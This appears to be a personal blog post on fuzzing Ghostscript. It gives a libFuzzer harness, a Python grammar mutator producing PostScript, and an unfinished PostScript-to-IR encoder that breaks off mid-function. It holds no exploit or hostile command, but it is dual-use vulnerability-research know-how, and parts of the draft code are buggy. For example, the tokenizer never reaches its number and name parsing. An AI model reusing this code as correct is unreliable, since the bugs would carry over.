# Fuzzing ghostscript

I was inspired by this blog post here: https://offsec.almond.consulting/ghostscript-cve-2023-28879.html to fuzz ghostscript with a custom grammar intermediate language (IR).

I wrote up this thing here:

```
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include "psi/iapi.h"
#include "psi/interp.h"
#include "psi/iminst.h"
#include "base/gserrors.h"

#include "python_mut.c" // Custom mutator

#define BUF_SIZE (1ul << 20)

static struct gs_main_instance_s *gs_inst = NULL;

static void write_program(const uint8_t *buf, size_t len) {
    FILE *f = fopen("/home/oof/program.ps", "wb"); // Debug message here...
    if (!f) return; // silently ignore if can't open
    fwrite(buf, 1, len, f);
    fclose(f);
}

int inited_python = 0;

// This runs once when the fuzzer starts
int LLVMFuzzerInitialize(int *argc, char ***argv) {
    if (!inited_python) {
        // Init python mut...
        init_python();
        atexit(finalize_python);
        inited_python = 1;
    }
    fprintf(stderr, "gsapi_new_instance gs_inst:\n"); // Print the current run...
    int code = gsapi_new_instance(&gs_inst, NULL);
    if (code < 0 || gs_inst == NULL) {
        fprintf(stderr, "Failed to create Ghostscript instance\n");
        abort();
    }
    fprintf(stderr, "gsapi_set_arg_encoding gs_inst\n"); // Print the current run...
    code = gsapi_set_arg_encoding(gs_inst, GS_ARG_ENCODING_UTF8);
    if (code != 0) {
        fprintf(stderr, "Failed to set arg encoding\n");
        abort();
    }
    const char *gsargv[] = {
        "gs",
        "-q",
        "-dSAFER",
        "-dNODISPLAY",
        "-dOutputFile=/dev/null",
        "-sstdout=/dev/null",
        "-dBATCH",
        "-dNOPAUSE",
        NULL
    };
    fprintf(stderr, "gsapi_init_with_args gs_inst:\n"); // Print the current run...
    code = gsapi_init_with_args(gs_inst,
        (int)(sizeof(gsargv) / sizeof(gsargv[0]) - 1),
        (char **)gsargv);
    if (code != 0) {
        fprintf(stderr, "Ghostscript init failed: %d\n", code);
        abort();
    }
    int exit_code = 0;
    gsapi_run_string_begin(gs_inst, 0, &exit_code);
    const char *prelude =
        "nulldevice "
        "/== { pop } def "
        "/=== { pop } def "
        "{ 360 mod exch 360 mod exch arcn } bind /arcn exch def "
        "{ 360 mod exch 360 mod exch arc } bind /arc exch def "
        "{ pop } /findfont exch def ";
    gsapi_run_string_continue(gs_inst, prelude, strlen(prelude), 0, &exit_code);
    fprintf(stderr, "gsapi_run_string_end gs_inst\n"); // Print the current run...
    code = gsapi_run_string_end(gs_inst, 0, &exit_code);
    if (code != 0) {
        fprintf(stderr, "Ghostscript warm-up failed: %d\n", code);
        abort();
    }
    return 0;
}
#ifndef TESTING
// Runs for every fuzz cycle before reinitialization
#define RUNCOUNT 1000
int run = 0;
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (!gs_inst || !data || size == 0) {
        return 0;
    }
    run++;
    fprintf(stderr, "current run: %d\n", run); // Print the current run...
    if (run > RUNCOUNT) {
        // Reinitialize every now and then
        run = 0;
        fprintf(stderr, "REINIT!!!\n");
        // gsapi_exit(gs_inst); // Maybe not needed????
        fprintf(stderr, "gsapi_delete_instance: %d\n", run); // Print the current run...
        gsapi_delete_instance(gs_inst);
        gs_inst = NULL;
        fprintf(stderr, "calling LLVMFuzzerInitialize: %d\n", run); // Print the current run...
        LLVMFuzzerInitialize(NULL, NULL);
    }
    const size_t kMaxOut = 1 << 20; // 1 MiB
    uint8_t *prog = NULL;
    size_t prog_len = 0;
    if (call_custom_mutator_py(data, size, kMaxOut, &prog, &prog_len) != 0) {
        // If Python failed, just bail out for this input.
        return 0;
    }
    int exit_code = 0;
    if (prog && prog_len) {
        const char cleanup[] = "cleardictstack clear cleartomark\ninitgraphics\n"; // Required initialization
        size_t cleanup_len = strlen(cleanup);
        uint8_t *prog_with_cleanup = malloc(prog_len + cleanup_len);
        if (!prog_with_cleanup) return 0;
        memcpy(prog_with_cleanup, prog, prog_len);
        memcpy(prog_with_cleanup + prog_len, cleanup, cleanup_len);
        write_program(prog_with_cleanup, prog_len + cleanup_len); // Write the shit...
        gsapi_run_string_with_length(gs_inst,
            (const char *)prog_with_cleanup,
            prog_len + cleanup_len,
            0, &exit_code);
        free(prog_with_cleanup);
    }
    free(prog);
    return 0;
}


#else


int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (!gs_inst || !data || size == 0) {
        return 0;
    }
    const size_t kMaxOut = 1 << 20; // 1 MiB
    uint8_t *prog = NULL;
    size_t prog_len = 0;
    if (call_custom_mutator_py(data, size, kMaxOut, &prog, &prog_len) != 0) {
        // If Python failed, just bail out for this input.
        return 0;
    }
    int exit_code = 0;
    if (prog && prog_len) {
        gsapi_run_string_with_length(gs_inst, prog, prog_len, 0, &exit_code); // Run the thing...
        // const char cleanup[] = " cleardictstack clear cleartomark";
        const char cleanup[] = ".forceinterp_exit\ncleardictstack clear cleartomark\n"; // Do the stuff...
        size_t cleanup_len = strlen(cleanup);
        // Allocate new buffer for prog + cleanup
        uint8_t *prog_with_cleanup = malloc(prog_len + cleanup_len);
        if (!prog_with_cleanup) return 0;

        memcpy(prog_with_cleanup, cleanup, cleanup_len);
        // Copy original fuzz program
        memcpy(prog_with_cleanup + cleanup_len, prog, prog_len);
        // Append cleanup instructions
        // memcpy(prog_with_cleanup + prog_len, cleanup, cleanup_len);
        write_program(prog_with_cleanup, prog_len + cleanup_len); // Write the shit...
        // Run program with cleanup at the end
        gsapi_run_string_with_length(gs_inst,
            (const char *)prog_with_cleanup,
            prog_len + cleanup_len,
            0, &exit_code);
        free(prog_with_cleanup);
    }
    free(prog);
    return 0;
}

#endif

```

and then I wrote up this custom mutator here:

```

import subprocess
import struct

FUNCS = None
NUM_FUNCS = None

# Feel free to edit
MAX_LIST_RECURSION = 2
MAX_LIST_LENGTH = 5
MAX_INTEGER = 10000
FLOAT_LENGTH = 4 # Use 4 byte floats
# How many expressions to put inside a generated procedure.
PROC_MAX_STMTS = 8   # cap; tweak as you like
PROC_MIN_STMTS = 1   # never emit an empty proc

SAFE_CHARS = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-.,:/"

MAX_NAME_LEN = 3
MAX_STRING_LEN = 10
MAX_HEX_STRING_LEN = 10


def setup():
	print("Called setup()...")
	global FUNCS
	global NUM_FUNCS
	# Runs the command in the source code directory to get all the strings
	out = subprocess.check_output(['grep', '-r', '{\\"', '/home/oof/ghostpdl/psi'])
	out = out.decode("ascii")
	lines = out.split("\n")
	functions = []
	nums = set(list("1234567890"))
	for l in lines:
		if "{\"" not in l or "zloop" in l: # Skip the loop thing..
			continue
		line = l[l.index("{\"")+2:]
		line = line[:line.index("\"")]
		arg_n = line[0]
		if arg_n not in nums:
			continue
		arg_n = int(arg_n)
		line = line[1:]
		if line[0] == "." or line[0] == "%": # Skip these for now.
			continue
		functions.append(tuple((line, arg_n)))
	FUNCS = functions # Set global var
	NUM_FUNCS = len(functions)
	return

setup() # Run setup function...

def get_int_mod(ir: bytes, length: int, max_int=None) -> (int, bytes): # Returns an integer taken from the byte stream of length bytes and modulo max_int.
	if len(ir) < length: # Not enough
		return None, None
	int_bytes = ir[:length]
	ir = ir[length:]
	integer = int.from_bytes(int_bytes, byteorder='little')
	if max_int:
		return integer % (max_int + 1), ir
	else:
		return integer, ir

def create_list_r(ir: bytes, r_level: int) -> (str, bytes): # The actual list creation function...
	length, ir = get_int_mod(ir, 1, max_int=MAX_LIST_LENGTH)
	if length is None or ir is None:
		return None, None
	out = "["
	for i in range(length): # Generate list...
		f, ir = get_int_mod(ir, 1, max_int=len(list_funcs)-1)
		if ir is None:
			break
		# Call the function
		f = list_funcs[f]
		f_out, ir = f(ir) # # Call
		if f_out is None or ir is None:
			break
		assert isinstance(f_out, str) # Should be a string...
		out += " " # Space between elements
		out += f_out

	out += "]"
	return out, ir

def gen_bool(ir):
	v, ir = get_int_mod(ir, 1, 1)
	if v is None: return None, None
	return ("true" if v else "false"), ir

def create_list(ir: bytes) -> (str, bytes):
	# Stub for now. Used to create lists as arguments...
	return create_list_r(ir, 0)

def create_integer(ir: bytes) -> (str, bytes):
	# Stub for now. Used to create integers as arguments...
	i, ir = get_int_mod(ir, 4, max_int=MAX_INTEGER)
	if ir is None:
		return None, None
	return str(i), ir # Inefficient because we use 4 bytes to store, but whatever...

'''
def create_float(ir: bytes) -> (str, bytes):
	# Stub for now. Used to create float arguments...
	if len(ir) < FLOAT_LENGTH:
		return None, None
	return str(struct.unpack('f', ir[:FLOAT_LENGTH])[0]), ir[FLOAT_LENGTH:]
'''

def create_float(ir: bytes) -> (str, bytes):
	# Stub for now. Used to create float arguments...
	a, ir = create_integer(ir)
	if ir == None:
		return None, None
	b, ir = create_integer(ir)
	if ir == None:
		return None, None
	return a+"."+b, ir

def create_function(ir: bytes) -> (str, bytes):
	"""
	Generate a PostScript procedure by decoding a small sequence of expressions
	from the same IR byte stream. The body is a flat list of exprs and is
	wrapped in curly braces so it can be used as an argument to ops like
	repeat/for/loop/if/ifelse/etc.

	Returns (procedure_string, remaining_ir) or (None, None) on insufficient IR.
	"""
	# Decide body length (1..PROC_MAX_STMTS)
	n, ir2 = get_int_mod(ir, 1, max_int=PROC_MAX_STMTS)
	if n is None or ir2 is None:
		return None, None
	if n < PROC_MIN_STMTS:
		n = PROC_MIN_STMTS

	parts = []
	cur = ir2
	for _ in range(n):
		expr, cur = decode_expr(cur, 1)  # recurse to build each statement
		if cur is None:                  # ran out of bytes
			break
		if expr:                         # keep non-empty lines
			parts.append(expr)

	if not parts:
		# Fallback to a harmless no-op-ish body if nothing was generated
		parts = ["0 pop"]  # pushes then pops to keep stack sane

	body = " ".join(parts)
	return "{ " + body + " }", cur

def create_string_literal(ir: bytes, max_len=MAX_HEX_STRING_LEN):
	n, ir = get_int_mod(ir, 1, max_int=max_len)
	if n is None or ir is None: return None, None
	if len(ir) < n: return None, None
	buf, ir = ir[:n], ir[n:]

	out = "("
	for b in buf:
		c = chr(b)
		if c == "(" or c == ")" or c == "\\":
			out += "\\" + c          # escape parens and backslash
		elif 32 <= b <= 126:
			out += c                 # printable ASCII
		else:
			out += f"\\{b:03o}"      # octal escape for binary
	out += ")"
	return out, ir

def create_string_hex(ir: bytes, max_len=MAX_STRING_LEN):
	n, ir = get_int_mod(ir, 1, max_len)       # number of bytes (not hex digits)
	if n is None or ir is None: return None, None
	if len(ir) < n: return None, None
	buf, ir = ir[:n], ir[n:]
	return "<" + buf.hex() + ">", ir          # even-length hex string

def create_name(ir: bytes, max_len=MAX_NAME_LEN):
	n, ir = get_int_mod(ir, 1, max_int=max_len)
	if n is None or ir is None: return None, None
	if len(ir) < n: return None, None
	raw, ir = ir[:n], ir[n:]
	# Map to safe name chars (avoid delimiters like (), <>, [], {}, /, %, #)
	mapped = bytes(SAFE_CHARS[b % len(SAFE_CHARS)] for b in raw).decode("ascii")
	literal_flag, ir = get_int_mod(ir, 1, max_int=1)   # 0=exec name, 1=literal /name
	if literal_flag is None or ir is None: return None, None
	return ("/" + mapped) if literal_flag else mapped, ir

list_funcs = [create_list, create_integer, create_float, gen_bool, create_function, create_string_literal, create_string_hex, create_name]
# list_funcs = [create_list, create_integer, create_float, gen_bool, create_function]
LEN_LIST_FUNCS = len(list_funcs)
EXTRA_AMOUNT = 0 # Not for now...

def decode_expr(ir: bytes, r_level: int) -> str:
	# Grab the function first...
	# assert False
	func_num, ir = get_int_mod(ir, 2, max_int=NUM_FUNCS-1) # Get the function number
	if ir == None:
		return None, None
	# Now generate arguments to the expression itself.
	# Get function string and argument count...
	f_str, num_args = FUNCS[func_num]
	args = []
	for i in range(num_args):
		# Get possible argument types
		arg_type, ir = get_int_mod(ir, 1, max_int=LEN_LIST_FUNCS-1) # Get argument type
		if ir is None:
			# return None, None
			break
		arg_func = list_funcs[arg_type] # Maybe something like this???
		arg_str, ir = arg_func(ir)
		if ir is None:
			# return None, None
			break
		args.append(arg_str)
	# Now the final expression is <argument1> <argument2> ... <function>
	if args:
		expr_string = " ".join(args) + " " + f_str
	else:
		expr_string = f_str
	return expr_string, ir

def decode_ir(ir: bytes, prevent_crash=True) -> bytes: # Converts intermediate representation to intermediate language...
	# print("Called decode_ir...")
	program = "" # The final program string which we generate from the ir
	while True:
		expr, ir = decode_expr(ir, 0)
		if ir is None: # Returned None so we ran out of bytes. Break out of loop.
			break
		# program += expr+"\n" # Add the expression to the program...
		if prevent_crash:
			program += "{ " + expr + " } stopped pop\n" # This is the postscript equivalent of try { ...something... } except { } in javascript. This is to prevent quitting on one bad expression...
		else: # Used for testing...
			program += expr + "\n"
	return program.encode("ascii")

def custom_mutator(data, max_size) -> bytes: # Custom mutator entrypoint
	out =  decode_ir(data)
	if len(out) > max_size:
		out = out[:max_size]
	return out

def main(): # Test the mutator...
	from tests import run_all_tests # Import tests
	run_all_tests() # Run all tests
	return

if __name__=="__main__":
	main()
	exit()


```

This works nicely, but we need to make a fuzzing corpus... and that is quite the problem since we can not use the raw PS files.

## Generating corpus...

So we need to make a program that converts raw postscript back to ir code basically the reverse of what our earlier python parser does...

Let's start something:

## 13.8.

Ok, so actually I made the entire IR stuff again because the IR I had previously was too complex. Here is my current stuff:

```
# tiny_ps_ir.py
from typing import Tuple, List
import struct
import setup # For functions and stuff...

setup.run_setup()

NUM_FUNCS = setup.NUM_FUNCS
FUNCS = setup.FUNCS

# --- opcodes ---
END_FILE = 0x00
END_EXPR = 0x01
I_INT    = 0x02
I_REAL32 = 0x03
I_BOOL   = 0x04
I_NULL   = 0x05
I_ENAME  = 0x06
I_LNAME  = 0x07
I_STRING = 0x08
I_HEX    = 0x09
ARR_S, ARR_E = 0xa, 0xb
PROC_S, PROC_E = 0xc, 0xd
DICT_S, DICT_E = 0xe, 0xf
LOOKUP_FUNC = 0x10
LOOKUP_VAR = 0x11

PROGRAM_VARIABLES = [] # Used to keep track of all the variables in the postscript program...

ALLOWED_CHARS = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# --- escape helpers for 0xFF-terminated fields ---
def esc_encode(data: bytes) -> bytes:
        out = bytearray()
        for b in data:
                if b == 0xFE:
                        out += b'\xFE\x00'
                elif b == 0xFF:
                        out += b'\xFE\x01'
                else:
                        out.append(b)
        out.append(0xFF)  # terminator
        return bytes(out)

def esc_decode(buf: bytes, i: int) -> Tuple[bytes, int]:
        out = bytearray()
        n = len(buf)
        while i < n:
                b = buf[i]; i += 1
                if b == 0xFF:
                        break
                out.append(ALLOWED_CHARS[b % len(ALLOWED_CHARS)])
        return bytes(out), i  # unterminated tolerantly returns

# --- zigzag varint ---
def zz_encode(n: int) -> int:
        return (n << 1) ^ (n >> 31)  # for 32-bit; adjust if using larger ints

def zz_decode(u: int) -> int:
        return (u >> 1) ^ -(u & 1)

def varint_encode(u: int) -> bytes:
        out = bytearray()
        while True:
                b = u & 0x7F
                u >>= 7
                if u:
                        out.append(b | 0x80)
                else:
                        out.append(b)
                        return bytes(out)

def varint_decode(buf: bytes, i: int) -> Tuple[int, int]:
        shift = 0; val = 0
        while i < len(buf):
                b = buf[i]; i += 1
                val |= (b & 0x7F) << shift
                if not (b & 0x80): return val, i
                shift += 7
        return val, i

# --- decoding to PostScript text ---
def ir_to_postscript(ir: bytes) -> bytes:
        global PROGRAM_VARIABLES
        PROGRAM_VARIABLES = []
        i = 0; out = bytearray()
        def sp():
                if out and out[-1] not in b" \n": out.append(0x20)
        while i < len(ir):
                op = ir[i]; i += 1
                op = op % 18 # Just do something like this????
                # if op == END_FILE:
                #       break
                if op == END_EXPR or op == END_FILE:
                        if out and out[-1] == 0x20: out[-1] = 0x0A
                        else: out.append(0x0A)
                elif op == I_INT:
                        u, i = varint_decode(ir, i)
                        n = zz_decode(u)
                        sp(); out += str(n).encode('ascii')
                elif op == I_REAL32:
                        '''
                        if i + 4 > len(ir): break
                        (f,) = struct.unpack_from('<f', ir, i); i += 4
                        sp(); out += ("{:.8g}".format(f)).encode('ascii')
                        '''
                        # Just get an integer and then use the stuff...
                        u, i = varint_decode(ir, i)
                        n = zz_decode(u)
                        float_val = str((n & 0xffff)).encode("ascii") + b"." + str((n & 0xffff0000)).encode("ascii")
                        sp(); out += float_val
                elif op == I_BOOL:
                        if i >= len(ir): break
                        b = ir[i]; i += 1
                        sp(); out += (b'true' if b else b'false')
                elif op == I_NULL:
                        sp(); out += b'null'
                elif op in (I_ENAME, I_LNAME, I_STRING, I_HEX):
                        data, i = esc_decode(ir, i)
                        #if op == I_ENAME: # Ban raw strings, because these break the program flow...
                        #       sp(); out += data
                        if op == I_LNAME: # Possibly new variable...
                                PROGRAM_VARIABLES.append(b"/" + data)
                                sp(); out += b'/' + data
                        elif op == I_STRING:
                                # escape (), \ minimally
                                s = data.replace(b'\\', b'\\\\').replace(b'(', b'\\(').replace(b')', b'\\)')
                                sp(); out += b'(' + s + b')'
                        else:  # HEX
                                sp(); out += b'<' + data.hex().encode('ascii') + b'>'
                elif op == ARR_S:
                        sp(); out += b'[ '
                elif op == ARR_E:
                        if out and out[-1] == 0x20: pass
                        out += b']'
                elif op == PROC_S:
                        sp(); out += b'{ '
                elif op == PROC_E:
                        if out and out[-1] == 0x20: pass
                        out += b'}'
                elif op == DICT_S:
                        sp(); out += b'<< '
                elif op == DICT_E:
                        if out and out[-1] == 0x20: pass
                        out += b'>>'
                elif op == LOOKUP_FUNC:
                        if i + 2 > len(ir): break
                        (f,) = struct.unpack_from('<h', ir, i); i += 2
                        assert NUM_FUNCS is not None
                        sp(); out += FUNCS[f % NUM_FUNCS][0].encode("ascii") # Add function name..
                elif op == LOOKUP_VAR:
                        if i + 2 > len(ir): break
                        (f,) = struct.unpack_from('<h', ir, i); i += 2
                        assert NUM_FUNCS is not None
                        if len(PROGRAM_VARIABLES) == 0:
                                sp(); out += b"/samplevar"
                        else:
                                sp(); out += PROGRAM_VARIABLES[f % len(PROGRAM_VARIABLES)][1:] # Reuse variable without leading slash...
                else:
                        print("op: "+str(op))
                        assert False
                        # unknown token: skip or insert 'pop' as safety
                        sp(); out += b'pop'
        print("PROGRAM_VARIABLES: "+str(PROGRAM_VARIABLES))
        if out and out[-1] != 0x0A:
                out.append(0x0A)
        return bytes(out)

# Main custom thing entrypoint...

def custom_mutator(data, max_size) -> bytes: # Custom mutator entrypoint
        out =  ir_to_postscript(data)
        if len(out) > max_size:
                out = out[:max_size]
        return out


# --- tiny helpers to build IR quickly ---
def emit_int(n: int) -> bytes:    return bytes([I_INT]) + varint_encode(zz_encode(n))
def emit_real32(x: float) -> bytes: return bytes([I_REAL32]) + struct.pack('<f', float(x))
def emit_bool(b: bool) -> bytes:  return bytes([I_BOOL, 1 if b else 0])
def emit_null() -> bytes:         return bytes([I_NULL])
def emit_ename(s: str) -> bytes:  return bytes([I_ENAME]) + esc_encode(s.encode('ascii'))
def emit_lname(s: str) -> bytes:  return bytes([I_LNAME]) + esc_encode(s.encode('ascii'))
def emit_string(b: bytes) -> bytes: return bytes([I_STRING]) + esc_encode(b)
def emit_hex(b: bytes) -> bytes:    return bytes([I_HEX]) + esc_encode(b)
def expr_end() -> bytes:          return bytes([END_EXPR])
def arr_s() -> bytes:             return bytes([ARR_S])
def arr_e() -> bytes:             return bytes([ARR_E])
def proc_s() -> bytes:            return bytes([PROC_S])
def proc_e() -> bytes:            return bytes([PROC_E])
def dict_s() -> bytes:            return bytes([DICT_S])
def dict_e() -> bytes:            return bytes([DICT_E])

IR_LEN = 1000
PROG_TEST_COUNT = 1000

import random

def gen_rand_bytes(n: int) -> bytes:
        return bytes([random.randrange(256) for _ in range(n)])

def test():
        ir = b''.join([
          emit_lname('boxsize'),
          emit_ename('inwidth'), emit_ename('inheight'), emit_ename('gt'),
          proc_s(),
                emit_ename('pagewidth'), emit_ename('inwidth'), emit_ename('truncate'),
                emit_int(1), emit_ename('.max'), emit_ename('div'),
          proc_e(),
          proc_s(),
                emit_ename('pageheight'), emit_ename('inheight'), emit_ename('truncate'),
                emit_int(1), emit_ename('.max'), emit_ename('div'),
          proc_e(),
          emit_ename('ifelse'), emit_ename('def'),
          expr_end(),
          # END_FILE.to_bytes(1,'little'),
        ])

        ps = ir_to_postscript(ir).decode('latin1')
        print(ps)

        for _ in range(PROG_TEST_COUNT):
                prog = gen_rand_bytes(IR_LEN)
                # Now decode...
                ps = ir_to_postscript(prog).decode('latin1')
                print(ps)
        return
if __name__=="__main__":
        test()
        exit(0)
```

and here is the inverse function:

```
# ps_to_ir.py
import re
import struct
from typing import List, Tuple

import setup
import forward as IR

# Build operator index from your FUNCS list
setup.run_setup()
FUNCS = setup.FUNCS
FUNC_INDEX = {name: i for i, (name, _argc) in enumerate(FUNCS)}

# Allowed chars (must match your tiny_ps_ir.ALLOWED_CHARS)
ALLOWED = IR.ALLOWED_CHARS
IDX = {chr(c): i for i, c in enumerate(ALLOWED)}

DEBUG = False

def dprint(s: str) -> None:
        """
        Debug printing.
        """
        if DEBUG:
                print("[DEBUG] "+str(s))
        return

def pack_allowed(s: bytes) -> bytes:
        """
        Map arbitrary bytes to your esc_decode domain:
        each output byte is 0..len(ALLOWED)-1 and then we append 0xFF.
        Non-allowed chars fall back to 'A' (index 26) or underscore choice if you prefer.
        """
        out = bytearray()
        for ch in s.decode('latin1'):
                if ch in IDX:
                        out.append(IDX[ch])
                else:
                        # fallback to 'A' (index 26) – tweak as you like
                        out.append(IDX.get('A', 0))
        out.append(0xFF)
        return bytes(out)

# ------------- Tokenizer (minimal but robust) -------------
_WS = b" \t\r\n\f\v"
_STOP = set(b"()[]{}<>/% \t\r\n\f\v")
_comment = re.compile(rb'%[^\r\n]*')
_number = re.compile(rb'[+-]?(?:\d+\.\d*|\d*\.\d+|\d+)')

def _skip_comment(b: bytes, i: int) -> int:
        n = len(b)
        while i < n and b[i] not in b"\r\n": i += 1
        return i

def _read_string(b: bytes, i: int) -> Tuple[str, int]:
        out = bytearray(b'('); i += 1; depth = 1; n = len(b)
        while i < n and depth > 0:
                c = b[i]; out.append(c); i += 1
                if c == ord('\\'):
                        if i < n: out.append(b[i]); i += 1
                elif c == ord('('): depth += 1
                elif c == ord(')'): depth -= 1
        return out.decode('latin1'), i

def _read_balanced(b: bytes, i: int, o: int, c: int) -> Tuple[str, int]:
        out = bytearray([b[i]]); i += 1; depth = 1; n = len(b)
        while i < n and depth > 0:
                ch = b[i]
                if ch == ord('%'):
                        j = _skip_comment(b, i); out += b[i:j]; i = j; continue
                if ch == ord('('):
                        s, i = _read_string(b, i); out += s.encode('latin1'); continue
                out.append(ch); i += 1
                if ch == o: depth += 1
                elif ch == c: depth -= 1
        return out.decode('latin1'), i

def _read_hex_or_dict(b: bytes, i: int) -> Tuple[str, int]:
        n = len(b)
        if i + 1 < n and b[i+1] == ord('<'):
                # dict
                out = bytearray(b'<<'); i += 2; depth = 1
                while i < n and depth > 0:
                        if b[i] == ord('%'):
                                j = _skip_comment(b, i); out += b[i:j]; i = j; continue
                        if b[i] == ord('('):
                                s, i = _read_string(b, i); out += s.encode('latin1'); continue
                        if i + 1 < n and b[i] == ord('<') and b[i+1] == ord('<'):
                                out += b'<<'; i += 2; depth += 1; continue
                        if i + 1 < n and b[i] == ord('>') and b[i+1] == ord('>'):
                                out += b'>>'; i += 2; depth -= 1; continue
                        out.append(b[i]); i += 1
                return out.decode('latin1'), i
        else:
                # hexstring
                out = bytearray(b'<'); i += 1
                while i < n:
                        out.append(b[i]); c = b[i]; i += 1
                        if c == ord('>'): break
                return out.decode('latin1'), i

def _read_word(b: bytes, i: int) -> Tuple[str, int]:
        n = len(b); s = i
        while i < n and b[i] not in _STOP:
                i += 1
        return b[s:i].decode('latin1'), i

def _split_expressions(ps: str) -> List[str]:
        """Split PS into logical expressions. If a line starts with /name, keep reading until top-level 'def'."""
        b = ps.encode('latin1'); i = 0; n = len(b)
        out, buf = [], bytearray()
        in_def = False
        while i < n:
                c = b[i]
                # comments
                if c == ord('%'):
                        i = _skip_comment(b, i); continue
                # strings and balanced blocks copied wholesale
                if c == ord('('):
                        s, i = _read_string(b, i); buf += s.encode('latin1'); continue
                if c == ord('['):
                        s, i = _read_balanced(b, i, ord('['), ord(']')); buf += s.encode('latin1'); continue
                if c == ord('{'):
                        s, i = _read_balanced(b, i, ord('{'), ord('}')); buf += s.encode('latin1'); continue
                if c == ord('<'):
                        s, i = _read_hex_or_dict(b, i); buf += s.encode('latin1'); continue

                # detect start of /name ... def
                if not buf.strip() and c == ord('/'):
                        in_def = True

                # if we’re in a /name block, close on top-level 'def'
                if in_def and c == ord('d') and b[i:i+3] == b'def' and (i+3==n or b[i+3] in _WS+b"()[]{}<>/%"):
                        buf += b'def'; i += 3
                        out.append(buf.decode('latin1').strip()); buf.clear(); in_def = False
                        # swallow trailing WS/newline
                        while i < n and b[i] in _WS:
                                if b[i] in b'\r\n':
                                        if b[i] == ord('\r') and i+1<n and b[i+1]==ord('\n'): i += 2
                                        else: i += 1
                                        break
                                i += 1
                        continue

                # newline ends expression only if not inside /name ... def
                if c in (ord('\n'), ord('\r')) and not in_def:
                        line = buf.decode('latin1').strip()
                        if line: out.append(line)
                        buf.clear()
                        if c == ord('\r') and i+1<n and b[i+1]==ord('\n'): i += 2
                        else: i += 1
                        continue

                buf.append(c); i += 1

        last = buf.decode('latin1').strip()
        if last: out.append(last)
        return out

def _tokenize_expr(expr: str) -> List[Tuple[str, str]]:
        """Return [('INT','123'), ('ENAME','moveto'), ('LNAME','box'), ('STRING','abc'), ...]"""
        b = expr.encode('latin1'); i = 0; n = len(b)
        toks: List[Tuple[str,str]] = []
        while i < n:
                dprint("Tokenizer...")
                dprint("Current stuff: "+str(b[i:]))
                while i < n and b[i] in _WS: i += 1
                if i >= n: break
                c = b[i]
                if c == ord('%'):
                        i = _skip_comment(b, i); continue
                elif c == ord('('):
                        s, i = _read_string(b, i); toks.append(('STRING', s)); continue
                elif c == ord('['):
                        s, i = _read_balanced(b, i, ord('['), ord(']')); toks.append(('ARRAY', s)); continue
                elif c == ord('{'):
                        s, i = _read_balanced(b, i, ord('{'), ord('}')); toks.append(('PROC', s)); continue
                elif c == ord('<'):
                        s, i = _read_hex_or_dict(b, i); toks.append(('HEXDICT', s)); continue
                elif c == ord('/'):
                        i += 1; w, i = _read_word(b, i); toks.append(('LNAME', w)); continue
                else:
                        dprint("Encountered invalid or weird syntax postscript. Continuing anyway...")
                        i += 1
                        continue
                m = _number.match(b, i)
                if m:
                        txt = m.group(0).decode('latin1'); i = m.end()
                        toks.append(('NUM', txt)); continue
                w, i = _read_word(b, i)
                if w: toks.append(('ENAME', w))
        return toks

# ------------- Encoder: tokens -> IR -------------
def _emit_name(name: str, defined_vars: List[str]) -> bytes:
        """Choose LOOKUP_FUNC, LOOKUP_VAR, or I_ENAME."""
        if name in FUNC_INDEX:
                idx = FUNC_INDEX[name]
                return bytes([IR.LOOKUP_FUNC]) + struct.pack('<h', idx)
        # variable reference?
        if ('/' + name) in defined_vars:
                vidx = defined_vars.index('/' + name)
                return bytes([IR.LOOKUP_VAR]) + struct.pack('<h', vidx)
        # fallback: raw executable name (requires ENAME branch enabled in decoder)
        return bytes([IR.I_ENAME]) + pack_allowed(name.encode('latin1'))

def ps_to_ir(ps_text: str) -> bytes:
        dprint("Called ps_to_ir...")
        defined_vars: List[str] = []   # track '/name' as decoder does
        out = bytearray()
        for line in _split_expressions(ps_text):
                toks = _tokenize_expr(line)
                for kind, val in toks:
                        if kind == 'NUM':
                                if '.' in val:
                                        # encode using your REAL32 varint packing (intpart.frac)
                                        try:
                                                intpart, frac = val.split('.', 1)
                                                intpart = max(0, min(0xFFFF, int(intpart or '0')))
                                                frac = ''.join(ch for ch in frac if ch.isdigit()) or '0'
                                                frac = max(0, min(0xFFFF, int(frac)))
                                        except Exception:
                                                intpart, frac = 0, 0
                                        u = (intpart << 16) | frac
                                        out += bytes([IR.I_REAL32]) + IR.varint_encode(IR.zz_encode(u))
                                else:
                                        out += bytes([IR.I_INT]) + IR.varint_encode(IR.zz_encode(int(val)))
                        elif kind == 'LNAME':
                                # define literal name
                                defined_vars.append('/' + val)
                                out += bytes([IR.I_LNAME]) + pack_allowed(val.encode('latin1'))
                        elif kind == 'ENAME':
                                out += _emit_name(val, defined_vars)
                        elif kind == 'STRING':
                                # keep body only, pack to allowed domain
                                body = val[1:-1]  # strip ( )
                                out += bytes([IR.I_STRING]) + pack_allowed(body.encode('latin1'))
                        elif kind == 'HEXDICT':
                                if val.startswith('<<'):
                                        out += bytes([IR.DICT_S])
                                        # we’re not parsing inner pairs here; treat as opaque text:
                                        # you can add a real dict parser later if needed.
                                        # For now just drop content; Ghostscript tolerates empty dicts often.
                                        out += bytes([IR.DICT_E])
                                else:
                                        hexbytes = bytes.fromhex(val[1:-1].strip())
                                        out += bytes([IR.I_HEX]) + pack_allowed(hexbytes)
                        elif kind == 'ARRAY':
                                out += bytes([IR.ARR_S])
                                inner = val[1:-1]
                                # recursive tokenize/encode of inner content
                                for k2,v2 in _tokenize_expr(inner):
                                        if k2 == 'NUM':
                                                if '.' in v2:
                                                        try:
                                                                a,b = v2.split('.',1); a = int(a or '0'); b = int(''.join(ch for ch in b if ch.isdigit()) or '0')
                                                        except Exception:
                                                                a,b = 0,0
                                                        u = ((a & 0xFFFF) << 16) | (b & 0xFFFF)
                                                        out += bytes([IR.I_REAL32]) + IR.varint_encode(IR.zz_encode(u))
                                                else:
                                                        out += bytes([IR.I_INT]) + IR.varint_encode(IR.zz_encode(int(v2)))
                                        elif k2 == 'LNAME':
                                                defined_vars.append('/' + v2)
                                                out += bytes([IR.I_LNAME]) + pack_allowed(v2.encode('latin1'))
                                        elif k2 == 'ENAME':
                                                out += _emit_name(v2, defined_vars)
